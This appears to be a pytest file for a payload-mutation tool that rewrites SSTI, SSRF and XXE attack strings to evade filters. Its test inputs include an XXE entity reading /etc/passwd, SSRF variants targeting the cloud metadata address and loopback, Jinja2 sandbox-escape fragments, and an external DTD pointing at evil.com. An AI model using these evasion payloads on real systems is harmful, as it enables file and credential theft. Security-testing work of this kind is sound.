"""Tests for SSTI, SSRF, and XXE class-specific mutators."""
import pytest

from waffen.mutate.ssti_ssrf_xxe import (
    # SSTI
    ssti_jinja2_attr_access,
    ssti_jinja2_filter_chain,
    ssti_jinja2_string_concat,
    ssti_twig_syntax,
    ssti_freemarker,
    ssti_generic_math_probe,
    ssti_unicode_escape,
    ssti_comment_break,
    ssti_hex_encode_strings,
    ssti_request_object,
    # SSRF
    ssrf_ip_decimal,
    ssrf_ip_octal,
    ssrf_ip_hex,
    ssrf_ip_ipv6_mapped,
    ssrf_ip_short,
    ssrf_url_double_encode,
    ssrf_dns_rebind,
    ssrf_redirect_bypass,
    ssrf_scheme_variation,
    ssrf_scheme_file,
    ssrf_cloud_metadata,
    ssrf_url_fragment,
    ssrf_localhost_alternatives,
    # XXE
    xxe_parameter_entity,
    xxe_dtd_external,
    xxe_cdata_wrap,
    xxe_encoding_declaration,
    xxe_xinclude,
    xxe_svg_wrapper,
    xxe_comment_obfuscate,
    xxe_nested_entity,
    xxe_utf7_encoding,
)


# ---------------------------------------------------------------------------
# SSTI
# ---------------------------------------------------------------------------

class TestSSTIJinja2AttrAccess:
    def test_replaces_class(self):
        assert "|attr('__class__')" in ssti_jinja2_attr_access("{{().__class__}}")

    def test_replaces_mro(self):
        assert "|attr('__mro__')" in ssti_jinja2_attr_access("x.__mro__")

    def test_no_dunder_unchanged(self):
        assert ssti_jinja2_attr_access("{{7*7}}") == "{{7*7}}"


class TestSSTIJinja2FilterChain:
    def test_splits_class(self):
        out = ssti_jinja2_filter_chain("__class__")
        assert "'__cla'~'ss__'" in out

    def test_splits_globals(self):
        out = ssti_jinja2_filter_chain("__globals__")
        assert "~" in out

    def test_no_dunder_unchanged(self):
        assert ssti_jinja2_filter_chain("hello") == "hello"


class TestSSTIJinja2StringConcat:
    def test_splits_inside_braces(self):
        out = ssti_jinja2_string_concat("{{'__class__'}}")
        assert "~" in out

    def test_no_string_unchanged(self):
        assert ssti_jinja2_string_concat("{{7*7}}") == "{{7*7}}"


class TestSSTITwigSyntax:
    def test_math_probe(self):
        assert "7*'7'" in ssti_twig_syntax("{{7*7}}")

    def test_config(self):
        assert "dump()" in ssti_twig_syntax("{{config}}")


class TestSSTIFreemarker:
    def test_converts(self):
        out = ssti_freemarker("${7*7}")
        assert "freemarker" in out.lower() or "Execute" in out


class TestSSTIGenericMathProbe:
    def test_produces_multi_engine(self):
        out = ssti_generic_math_probe("test 7*7 payload")
        assert "{{7*7}}" in out or "${7*7}" in out

    def test_existing_template_unchanged(self):
        out = ssti_generic_math_probe("{{7*7}}")
        assert "{{7*7}}" in out


class TestSSTIUnicodeEscape:
    def test_escapes_jinja2(self):
        out = ssti_unicode_escape("{{7*7}}")
        assert "\\u007b" in out
        assert "{{" not in out

    def test_escapes_dollar(self):
        out = ssti_unicode_escape("${cmd}")
        assert "\\u0024" in out


class TestSSTICommentBreak:
    def test_inserts_jinja_comment(self):
        out = ssti_comment_break("{{7*7}}")
        assert "{#x#}" in out

    def test_non_jinja(self):
        out = ssti_comment_break("${7*7}")
        assert "{#x#}" in out


class TestSSTIHexEncodeStrings:
    def test_encodes_string_arg(self):
        out = ssti_hex_encode_strings("attr('__class__')")
        assert "\\x" in out

    def test_no_string_unchanged(self):
        assert ssti_hex_encode_strings("7*7") == "7*7"


class TestSSTIRequestObject:
    def test_replaces_config(self):
        out = ssti_request_object("{{config}}")
        assert "request" in out


# ---------------------------------------------------------------------------
# SSRF
# ---------------------------------------------------------------------------

class TestSSRFIpDecimal:
    def test_loopback(self):
        assert "2130706433" in ssrf_ip_decimal("http://127.0.0.1/path")

    def test_metadata(self):
        out = ssrf_ip_decimal("http://169.254.169.254/latest")
        assert "169.254" not in out
        assert "2852039166" in out


class TestSSRFIpOctal:
    def test_loopback(self):
        out = ssrf_ip_octal("http://127.0.0.1/path")
        assert "0177" in out
        assert "01" in out

    def test_no_ip_unchanged(self):
        assert ssrf_ip_octal("http://example.com") == "http://example.com"


class TestSSRFIpHex:
    def test_loopback(self):
        assert "0x7f000001" in ssrf_ip_hex("http://127.0.0.1/")


class TestSSRFIpIpv6Mapped:
    def test_loopback(self):
        out = ssrf_ip_ipv6_mapped("http://127.0.0.1/")
        assert "::ffff:127.0.0.1" in out
        assert "[" in out


class TestSSRFIpShort:
    def test_loopback(self):
        assert "127.1" in ssrf_ip_short("http://127.0.0.1/")

    def test_zero(self):
        assert ssrf_ip_short("http://0.0.0.0/") == "http://0/"


class TestSSRFUrlDoubleEncode:
    def test_http(self):
        out = ssrf_url_double_encode("http://127.0.0.1/")
        assert "http%3A%2F%2F" in out

    def test_https(self):
        out = ssrf_url_double_encode("https://internal/")
        assert "https%3A%2F%2F" in out


class TestSSRFDnsRebind:
    def test_loopback(self):
        assert "nip.io" in ssrf_dns_rebind("http://127.0.0.1/")

    def test_metadata(self):
        assert "nip.io" in ssrf_dns_rebind("http://169.254.169.254/")


class TestSSRFRedirectBypass:
    def test_adds_at(self):
        out = ssrf_redirect_bypass("http://127.0.0.1/secret")
        assert "@127.0.0.1" in out


class TestSSRFSchemeVariation:
    def test_to_gopher(self):
        assert "gopher://" in ssrf_scheme_variation("http://127.0.0.1/")

    def test_no_scheme_unchanged(self):
        assert ssrf_scheme_variation("plain") == "plain"


class TestSSRFSchemeFile:
    def test_metadata_to_file(self):
        out = ssrf_scheme_file("http://169.254.169.254/creds")
        assert "file://" in out

    def test_fallback(self):
        out = ssrf_scheme_file("ftp://other/")
        assert "file:///etc/passwd" in out


class TestSSRFCloudMetadata:
    def test_hex_ip(self):
        out = ssrf_cloud_metadata("http://169.254.169.254/latest")
        assert "0xa9fea9fe" in out


class TestSSRFUrlFragment:
    def test_adds_fragment(self):
        out = ssrf_url_fragment("http://127.0.0.1/")
        assert "#@" in out

    def test_no_scheme_unchanged(self):
        assert ssrf_url_fragment("plain") == "plain"


class TestSSRFLocalhostAlternatives:
    def test_replaces_loopback(self):
        out = ssrf_localhost_alternatives("http://127.0.0.1/")
        assert "localtest.me" in out

    def test_replaces_localhost(self):
        out = ssrf_localhost_alternatives("http://localhost/")
        assert "localtest.me" in out


# ---------------------------------------------------------------------------
# XXE
# ---------------------------------------------------------------------------

_BASIC_XXE = (
    '<?xml version="1.0"?>'
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    '<foo>&xxe;</foo>'
)


class TestXXEParameterEntity:
    def test_adds_percent(self):
        out = xxe_parameter_entity(_BASIC_XXE)
        assert "% xxe" in out or "%xxe" in out

    def test_uses_percent_ref(self):
        out = xxe_parameter_entity(_BASIC_XXE)
        assert "%xxe;" in out


class TestXXEDtdExternal:
    def test_external_ref(self):
        out = xxe_dtd_external(_BASIC_XXE)
        assert "evil.com" in out
        assert "SYSTEM" in out

    def test_no_doctype(self):
        out = xxe_dtd_external("<foo>bar</foo>")
        assert "DOCTYPE" in out


class TestXXECdataWrap:
    def test_wraps(self):
        out = xxe_cdata_wrap("data &xxe; end")
        assert "CDATA" in out

    def test_no_entity_unchanged(self):
        assert xxe_cdata_wrap("no entity") == "no entity"


class TestXXEEncodingDeclaration:
    def test_sets_utf16(self):
        out = xxe_encoding_declaration(_BASIC_XXE)
        assert "UTF-16" in out

    def test_no_prolog_prepends(self):
        out = xxe_encoding_declaration("<foo/>")
        assert "UTF-16" in out


class TestXXEXInclude:
    def test_has_xinclude(self):
        out = xxe_xinclude(_BASIC_XXE)
        assert "xi:include" in out
        assert "file:///etc/passwd" in out


class TestXXESvgWrapper:
    def test_has_svg(self):
        out = xxe_svg_wrapper(_BASIC_XXE)
        assert "svg" in out.lower()

    def test_has_entity(self):
        out = xxe_svg_wrapper("plain")
        assert "ENTITY" in out


class TestXXECommentObfuscate:
    def test_inserts_comments(self):
        out = xxe_comment_obfuscate(_BASIC_XXE)
        assert "<!-- xxe -->" in out or "<!-- s -->" in out


class TestXXENestedEntity:
    def test_has_two_entities(self):
        out = xxe_nested_entity(_BASIC_XXE)
        assert "ENTITY a" in out
        assert "ENTITY b" in out
        assert "&b;" in out


class TestXXEUtf7Encoding:
    def test_sets_utf7(self):
        out = xxe_utf7_encoding(_BASIC_XXE)
        assert "UTF-7" in out


# ---------------------------------------------------------------------------
# Registry integration
# ---------------------------------------------------------------------------

class TestRegistryIntegration:
    def test_ssti_count(self):
        from waffen.mutate.base import REGISTRY
        ssti = [m for m in REGISTRY._m.values() if "SSTI" in m.classes]
        assert len(ssti) == 10

    def test_ssrf_count(self):
        from waffen.mutate.base import REGISTRY
        ssrf = [m for m in REGISTRY._m.values() if "SSRF" in m.classes]
        assert len(ssrf) == 13

    def test_xxe_count(self):
        from waffen.mutate.base import REGISTRY
        xxe = [m for m in REGISTRY._m.values() if "XXE Injection" in m.classes]
        assert len(xxe) == 9

    def test_select_ssti(self):
        from waffen.mutate.base import REGISTRY
        selected = REGISTRY.select(attack_class="SSTI")
        names = {m.name for m in selected}
        assert "ssti_jinja2_attr_access" in names
        assert "ssti_unicode_escape" in names

    def test_select_ssrf(self):
        from waffen.mutate.base import REGISTRY
        selected = REGISTRY.select(attack_class="SSRF")
        names = {m.name for m in selected}
        assert "ssrf_ip_decimal" in names
        assert "ssrf_dns_rebind" in names

    def test_select_xxe(self):
        from waffen.mutate.base import REGISTRY
        selected = REGISTRY.select(attack_class="XXE Injection")
        names = {m.name for m in selected}
        assert "xxe_parameter_entity" in names
        assert "xxe_xinclude" in names
